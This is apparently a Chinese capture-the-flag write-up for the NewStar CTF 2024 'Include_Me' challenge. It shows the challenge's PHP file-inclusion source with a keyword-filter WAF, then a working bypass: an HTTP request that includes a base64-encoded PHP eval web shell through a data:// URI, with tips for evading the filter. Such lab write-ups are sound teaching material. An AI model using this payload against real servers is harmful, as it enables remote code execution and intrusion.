---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---

# Include_Me

打开题目 5s 后会自动跳转搜索 PHP 伪协议

![跳转结果](/assets/images/wp/2024/week3/include-me_1.png)

要防止跳转，使用 GET 传入 `iknow` 即可

题目源码如下

```php
<?php
highlight_file(__FILE__);
function waf() {
    if(preg_match("/<|\?|php|>|echo|filter|flag|system|file|%|&|=|`|eval/i",$_GET['me'])){
        die("兄弟你别包");
    };
}
if (isset($_GET['phpinfo'])) {
    phpinfo();
}

// 兄弟你知道了吗？
if (!isset($_GET['iknow'])) {
    header("Refresh: 5;url=https://cn.bing.com/search?q=php%E4%BC%AA%E5%8D%8F%E8%AE%AE");
}

waf();
include $_GET['me'];
echo "兄弟你好香";
?>
```

我们使用 GET 传入 `phpinfo` 后可验证远程文件包含漏洞的必要条件满足

![phpinfo](/assets/images/wp/2024/week3/include-me_2.png)

接着就是绕 waf，这里使用的是 data 协议加 base64 加密

```http
GET /?iknow=1&me=data:text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWzBdKT8+%2B HTTP/1.1
```

`<?php @eval($_POST[0])?>` 的 Base64 加密结果为 `PD9waHAgQGV2YWwoJF9QT1NUWzBdKT8+`，加号作转义

::: warning 注意

这里有几点需要注意：

- Base64 加密后的字符串不能带有 `=`，因为会被 waf，这时直接删掉结尾等号即可，后者在明文后面多加一些空格以使加密结果不带等号
- 若密文最后是 `+` 的话，我们在 GET 传参必须将其编码为 `%2B`，不然 `+` 会被视作空格

:::
